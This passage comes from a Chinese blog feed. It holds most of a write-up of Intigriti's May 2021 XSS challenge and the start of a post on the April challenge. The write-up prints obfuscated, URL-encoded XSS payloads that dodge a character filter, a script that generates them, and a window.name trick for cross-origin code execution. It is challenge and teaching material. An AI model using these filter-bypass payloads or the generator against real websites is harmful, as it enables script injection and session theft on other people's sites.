23;0/0&#125;`[1]+`$&#123;e&#125;`[21]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[14]+`$&#123;e&#125;`[21]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;0/0&#125;`[1]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``[0]&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`.`+17[`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[9]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[15]]`36`+`$&#123;0/0&#125;`[1]+`$&#123;e&#125;`[18]+17[`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[9]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[5]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[15]]`36`+`.`+`$&#123;e&#125;`[18]+`$&#123;e&#125;`[21]+`$&#123;``[0]&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[5]+`e`+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[14]+1+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[15]+`$&#123;[][`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;``[0]&#125;`[1]+`$&#123;e&#125;`[18]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;e&#125;`[13]+`$&#123;``[0]&#125;`[0]+`$&#123;``+&#123;&#125;&#125;`[5]+`$&#123;``+&#123;&#125;&#125;`[6]+`$&#123;``+&#123;&#125;&#125;`[1]+`$&#123;e&#125;`[13]]&#125;`[15]&#125;`` ` 網址則是： https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;e&#96;%2b31[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[9]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[15]]&#96;36&#96;%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[14]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;.&#96;%2b17[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[9]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[15]]&#96;36&#96;%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b17[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[9]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[15]]&#96;36&#96;%2b&#96;.&#96;%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;e&#96;%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[14]%2b1%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[15]%2b&#96;$&#123;[][&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;&#96;&#96;[0]&#125;&#96;[0]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[5]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[6]%2b&#96;$&#123;&#96;&#96;%2b&#123;&#125;&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#125;&#96;[15]&#125;&#96;&#96;+&#96;#alert(document.domain) 挑戰最短程式碼可以執行任意程式碼之後，還有什麼可以玩呢？那就是挑戰最短的程式碼！試著把程式碼弄到最短看看。 可以想到的有： 1.不要用 ｀｀[0] 拿到 undefined，而是用 e[0]，可以省一個字元2. &#96;&#96;+{} 來拿 [object Object] 其實多此一舉，用 &#123;&#125; 就好，省了三個字3. 有可以用到 e 的地方盡量用到 e，因為程式碼會最少 再來我們本來是用 [][&#39;constructor&#39;] 來拿到 function，這樣有點太長了，可以用很科學的方式來找出最短的： let min = 99 let winner = '' for (let prop of Object.getOwnPropertyNames(Array.prototype)) &#123; const len = getString(prop).length if (len &lt; min) &#123; min = len winner = prop &#125; &#125; console.log(winner, min) 找出來的冠軍是 some，可以拿來取代本來使用的 [][&#39;constructor&#39;]。 最後呢，因為我們不需要執行任意程式碼了，所以用 alert(document.domain) 就好，至於 eval(name) 的話雖然乍看之下更短，但因為要拿到 v 不容易，所以其實會花費更多字元。 底下是產生出來的結果，長度 466 個字： length: 466 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[13]+&#96;$&#123;e[0]&#125;&#96;[0]+&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[21]+&#96;e&#96;+&#96;$&#123;e&#125;&#96;[13]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[13]+&#96;$&#123;e[0]&#125;&#96;[2]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e[0]&#125;&#96;[0]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;e&#125;&#96;[6]+&#96;.&#96;+&#96;$&#123;e[0]&#125;&#96;[2]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e[0]&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96; &#96; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;e[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;e&#96;%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[13]%2b&#96;$&#123;e[0]&#125;&#96;[2]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;.&#96;%2b&#96;$&#123;e[0]&#125;&#96;[2]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e[0]&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96;+&#96; 用來產生的程式碼是： const mapping = &#123; a: '`$&#123;0/0&#125;`[1]', b: '`$&#123;e&#125;`[2]', c: '`$&#123;e&#125;`[5]', d: '`$&#123;e[0]&#125;`[2]', e: '`e`', f: '`$&#123;e[0]&#125;`[4]', g: '`$&#123;e&#125;`[15]', i: '`$&#123;e[0]&#125;`[5]', j: '`$&#123;e&#125;`[3]', l: '`$&#123;e&#125;`[21]', m: '`$&#123;e&#125;`[23]', n: '`$&#123;e&#125;`[25]', o: '`$&#123;e&#125;`[1]', r: '`$&#123;e&#125;`[13]', s: '`$&#123;e&#125;`[18]', t: '`$&#123;e&#125;`[6]', u: '`$&#123;e[0]&#125;`[0]', \".\": '`.`' &#125; function getString(str) &#123; return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+') &#125; const some = getString('some') mapping['('] = '`$&#123;[][' + some + ']&#125;`[13]' mapping[')'] = '`$&#123;[][' + some + ']&#125;`[14]' const cons = getString('constructor') let strConstructor = '``['+ cons + ']' strConstructor = '`$&#123;' + strConstructor + '&#125;`' const strToString = `$&#123;mapping.t&#125;+$&#123;mapping.o&#125;+$&#123;strConstructor&#125;[9]+$&#123;mapping.t&#125;+$&#123;mapping.r&#125;+$&#123;mapping.i&#125;+$&#123;mapping.n&#125;+$&#123;mapping.g&#125;` mapping.v = '31[' + strToString + ']`36`' const ans = \"[][\" + getString('some') + \"][\"+ getString('constructor') + \"]`_$&#123;\" + getString('alert(document.domain)') + \"&#125;```\" console.log('length:', ans.length) console.log('======= Payload =======') console.log(ans) console.log('======= URL =======') console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\\+/g, '%2b')) 再次縮短把上面的結果拿去平台上 submit 之後，作者說目前看到最短的是 376 個字元。我想了一陣子發現想不太到，然後就靈機一動想說：「那來試試看 v 那個方法好了，先不管瀏覽器問題」 幫大家回顧一下瀏覽器問題是什麼，那問題就是如果想用 function to string 的方式拿到 v，Chrome 跟 Firefox 產生的結果不同： []['some']+'' // Chrome \"function some() &#123; [native code] &#125;\" v: index 23 // Firefox \"function some() &#123; [native code] &#125;\" v: index 27 所以同一個 payload 無法同時應用在這兩個網頁上面。 先不管這問題的話，產生出來的結果是這樣： length: 376 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[13]+&#96;$&#123;e[0]&#125;&#96;[0]+&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;e&#96;+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[23]+&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[21]+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[13]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96; &#96; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;e[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;e&#96;%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[23]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[13]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96; &#96; 376 個字，跟剛剛的 466 比起來少了快一百個。 用來產生的完整程式碼： const mapping = &#123; a: '`$&#123;0/0&#125;`[1]', b: '`$&#123;e&#125;`[2]', c: '`$&#123;e&#125;`[5]', d: '`$&#123;e[0]&#125;`[2]', e: '`e`', f: '`$&#123;e[0]&#125;`[4]', g: '`$&#123;e&#125;`[15]', i: '`$&#123;e[0]&#125;`[5]', j: '`$&#123;e&#125;`[3]', l: '`$&#123;e&#125;`[21]', m: '`$&#123;e&#125;`[23]', n: '`$&#123;e&#125;`[25]', o: '`$&#123;e&#125;`[1]', r: '`$&#123;e&#125;`[13]', s: '`$&#123;e&#125;`[18]', t: '`$&#123;e&#125;`[6]', u: '`$&#123;e[0]&#125;`[0]', \".\": '`.`' &#125; function getString(str) &#123; return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+') &#125; const some = getString('some') mapping['('] = '`$&#123;[][' + some + ']&#125;`[13]' mapping[')'] = '`$&#123;[][' + some + ']&#125;`[14]' mapping.v = '`$&#123;[][' + getString('some') + ']&#125;`[23]' const ans = \"[][\" + getString('some') + \"][\"+ getString('constructor') + \"]`_$&#123;\" + getString('eval(name)') + \"&#125;```\" console.log('length:', ans.length) console.log('======= Payload =======') console.log(ans) console.log('======= URL =======') console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\\+/g, '%2b')) 有些人可能不知道為什麼 eval(name) 可以，這是因為 window.name 是個神奇的屬性，基本上同一個分頁的 name 會相同，所以我們只要自己新建一個 html，裡面寫 JS 並且設定 window.name = &#39;alert(document.domain)&#39;，然後用 location= 跳轉到 PHP 那邊，那裡的 name 就會是我們剛剛設定好的。 沒錯，跨網域也適用。 因為我最後試出來的結果也是 376 個字，跟作者說的最短 payload 相同，詢問過後發現其實就是同一個。 結語從這個挑戰中可以學到一些 JS 相關的東西，像是： 在限制之下湊出指定字元 用反引號 backtick 來呼叫函式以及參數的規則 用 function constructor 動態建立函式 這些知識在什麼時候會有用呢？對攻擊者而言，當你碰到一個有過濾字元的地方的時候，就可以利用這些技巧想辦法繞過限制。 對防禦方來說，在過濾時就需要考量到這些繞過的方法，如果知道可以這樣繞過，就能把 filter 訂得更精確。 不過這都只是後話，對我來說會解這些題目只是因為好玩，也沒有去想說會有什麼幫助，那些都是以後的事了。 這個平台每個月都會有 XSS 挑戰，期待之後的更多挑戰！","link":"/2021/06/07/xss-challenge-by-intigriti-writeup-may/"},{"title":"解題心得：Intigriti's 0421 XSS challenge（上）","text":"前言有天我在網路上閒晃的時候，看到了一個 XSS challenge：Intigriti’s 0421 XSS challenge - by @terjanq，除了這個挑戰本身很吸引我之外，更吸引我的是出題的作者。 之前在網路上找到的許多比較偏前端的資安相關資源，都是由這個作者在維護或是貢獻的，例如說 Tiny XSS Payloads 或者是令人大開眼界的 XS-Leaks Wiki。 Intigriti 這個網站似乎每個月都會舉辦這種 XSS challenge，而這一次的是他們有史以來舉辦過最難的一個。挑戰時間從 4&#x2F;19~4&#x2F;25，有一週的時間可以嘗試，最後成功解出的有 15 人。三月份的挑戰有 45 人解開，二月份有 33 人，所以這一次解出的人數確實少了許多，可想而知題目的難度。 我大概花了五天的時間，每天卡關的時候都想說「放棄好了，坐等解答」，但卻又時不時會有一些新的想法出現，想說就繼續試一下，最後終於在截止的那一天於時限前解開，解開的時候雙手握拳然後手肘往後，大喊：「太神辣」。 這篇想來記錄一下解題的心得，之前有寫了英文版的但大概比小學生作文還不如，還是寫個中文版的比較能完整表達自己的想法。標題會有個「上」是因為這篇寫我的解法，下一篇想來寫作者的解法，下下篇分析其他人的解法。 但我的部落格似乎被下了還沒寫好的系列文都會斷連載的詛咒，希望這次可以撐過去。 題目內容題目在這邊：https://challenge-0421.intigriti.io/ 目標是要在這個網站上成功執行 XSS，執行 alert(&#39;flag&#123;THIS_IS_THE_FLAG&#125;&#39;) 才算獲勝。 這道題目一共有兩個網頁，第一個是 